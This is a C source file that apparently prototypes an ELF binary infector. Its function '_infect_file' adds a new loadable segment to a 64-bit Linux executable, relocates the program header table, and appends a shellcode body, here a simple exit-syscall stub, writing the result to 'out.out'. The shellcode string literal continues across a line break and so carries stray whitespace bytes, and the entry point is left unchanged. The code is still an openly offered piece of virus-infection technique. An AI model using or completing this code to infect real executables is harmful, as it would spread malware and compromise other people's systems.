#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

#define ALIGN_UP(arg, align) (((arg) % (align)) ? (((arg) / (align) + 1) * (align)) : (arg))

#define ALIGN_DN(arg, align) ((arg) - (arg) % (align))


#define _syscall_wrap(num, ...) syscall(num, __VA_ARGS__)

/*
long _syscall_wrap(long number, ...)
{
	long resultvar;
	asm volatile (
	"movq %%rsi, 	%%rdi	\n\t"
	"movq %%rdx, 	%%rsi	\n\t"
	"movq %%rcx, 	%%rdx	\n\t"
	"movq %%r8, 	%%r10	\n\t"
	"movq %%r9, 	%%r8	\n\t"
	"movq 8(%%rsp),	%%r9	\n\t"
	"syscall		\n\t"
	: "=a" (resultvar)
	: "rax" (number)
	: "memory", "cc", "r11", "cx", "rdi", "rsi", "rdx", "r10", "r8", "r9");
	return resultvar;
}
*/

int _infect_file(const char *target_path, void *body, size_t body_s)
{
	/* Open, mmap */
	int target_fd = _syscall_wrap(SYS_open, target_path, O_RDWR);
	if (target_fd == -1)
		return -1;
	struct stat statbuf;
	if (_syscall_wrap(SYS_fstat, target_fd, &statbuf) == -1)
		return -1;
	char *mem = (void*) _syscall_wrap(SYS_mmap, NULL, statbuf.st_size,
					  PROT_READ | PROT_WRITE, MAP_PRIVATE,
					  target_fd, 0);
	if (mem == MAP_FAILED) {
		_syscall_wrap(SYS_exit, 15);
		return -1;
	}

	Elf64_Ehdr *e_hdr = (Elf64_Ehdr*) mem;
	
	/* Check elf exec */
	// Add exec and dyn check
	if (e_hdr->e_ident[EI_MAG0]  	^ ELFMAG0 	|
	    e_hdr->e_ident[EI_MAG1]  	^ ELFMAG1 	|
	    e_hdr->e_ident[EI_MAG2]  	^ ELFMAG2 	|
	    e_hdr->e_ident[EI_MAG3]  	^ ELFMAG3	|
	    e_hdr->e_ident[EI_CLASS] 	^ ELFCLASS64)
		return -1;

	/* Find last LOAD segment, shift every p_offset */
	Elf64_Phdr *last_load = NULL;
	Elf64_Phdr *table_phdr = NULL;

	for (Elf64_Phdr *p_hdr = (Elf64_Phdr*) (mem + e_hdr->e_phoff); 
	     p_hdr < (Elf64_Phdr*) (mem + e_hdr->e_phoff) + e_hdr->e_phnum; 
	     p_hdr++) {
		if (p_hdr->p_type == PT_LOAD)
			last_load = p_hdr;
		else if (p_hdr->p_type == PT_PHDR)
			table_phdr = p_hdr;
	}

	if (last_load == NULL || table_phdr == NULL)
		return -1;

	Elf64_Phdr toinject_hdr = {
		.p_align	= last_load->p_align,
		.p_offset 	= ALIGN_UP(last_load->p_offset + last_load->p_filesz, last_load->p_align),
		.p_vaddr	= ALIGN_UP(last_load->p_vaddr  + last_load->p_memsz,  last_load->p_align),
		.p_paddr	= ALIGN_UP(last_load->p_paddr  + last_load->p_memsz,  last_load->p_align),
		.p_filesz	= table_phdr->p_filesz + sizeof(Elf64_Phdr) + body_s,
		.p_memsz	= table_phdr->p_filesz + sizeof(Elf64_Phdr) + body_s,
		.p_type 	= PT_LOAD,
		.p_flags	= (PF_R | PF_W) };

	table_phdr->p_filesz += sizeof(toinject_hdr);
	table_phdr->p_memsz  = table_phdr->p_filesz;
	table_phdr->p_vaddr  = toinject_hdr.p_vaddr;
	table_phdr->p_paddr  = toinject_hdr.p_paddr;
	table_phdr->p_offset = toinject_hdr.p_offset;
	table_phdr->p_flags  = toinject_hdr.p_flags;
	
	e_hdr->e_phoff = table_phdr->p_offset;
	e_hdr->e_phnum++;
	size_t inject_pos = (size_t) toinject_hdr.p_offset;
	size_t last_load_end_offs = last_load->p_offset + last_load->p_filesz;
	e_hdr->e_shoff += inject_pos - last_load_end_offs + toinject_hdr.p_filesz;

	/* Write changes to binary */
	int out_fd = _syscall_wrap(SYS_creat, "out.out", statbuf.st_mode);
	_syscall_wrap(SYS_write, out_fd, mem, last_load_end_offs);
	_syscall_wrap(SYS_lseek, out_fd, inject_pos, SEEK_SET);
	_syscall_wrap(SYS_write, out_fd, table_phdr, table_phdr->p_filesz - sizeof(Elf64_Phdr));
	_syscall_wrap(SYS_write, out_fd, &toinject_hdr, sizeof(Elf64_Phdr));
	_syscall_wrap(SYS_write, out_fd, body, body_s);
	_syscall_wrap(SYS_write, out_fd, mem + last_load_end_offs, statbuf.st_size - last_load_end_offs); 
	_syscall_wrap(SYS_close, out_fd);

	_syscall_wrap(SYS_munmap, mem, statbuf.st_size);
	_syscall_wrap(SYS_close, target_fd);

	return 0;
}


int main(int argc, char *argv[])
{
	if (argc != 2)
		return EXIT_FAILURE;

	char str_exit[] = "\x48\xC7\xC0\x3C\x00\x00\x00\x48	\
			   \xC7\xC7\x3C\x00\x00\x00\x0F\x05";
	return _infect_file(argv[1], str_exit, sizeof(str_exit));
}
